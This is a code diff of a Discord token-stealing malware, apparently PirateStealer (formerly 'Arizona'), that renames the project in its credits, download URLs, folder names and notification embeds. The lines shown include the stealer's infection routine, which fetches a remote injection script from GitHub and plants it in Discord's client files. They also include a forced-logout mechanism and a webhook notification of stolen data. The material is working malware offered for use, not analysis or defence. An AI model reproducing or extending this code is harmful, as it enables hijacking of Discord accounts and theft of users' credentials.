@@ -1,11 +1,10 @@
-
 // Thanks to https://github.com/mewzax who actually reuploaded the files (while it was deleted). You can file the old source code of PS at https://github.com/Mewzax/PirateStealer
 
 /* 
     Creators: Stanley-GF & bytixo
-    Project Name: Arizona
+    Project Name: PirateStealer
     Languages: JS, JS, RS (C# injectors can be found on Github)
-    Contribute: https://github.com/Stanley-GF/Arizona
+    Contribute: https://github.com/Stanley-GF/PirateStealer
 */
 
 const glob = require("glob");
@@ -46,7 +45,7 @@ discords.forEach(function(file) {
 listDiscords();
 
 function Infect() {
-    https.get('https://raw.githubusercontent.com/Stanley-GF/Arizona/main/src/injection/injection-clean.js', (resp) => {
+    https.get('https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/injection/injection-clean.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
@@ -66,7 +65,7 @@ function Infect() {
                 }
 
                 if ( config.logout != "false" ) {
-                    let folder = file.replace("index.js", "ArizonaBTW")
+                    let folder = file.replace("index.js", "PirateStealerBTW")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
@@ -158,10 +157,10 @@ function injectNotify() {
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": "Arizona"
+              "name": "PirateStealer"
             },
             "footer": {
-              "text": "Arizona"
+              "text": "PirateStealer"
             }
           }
         ]
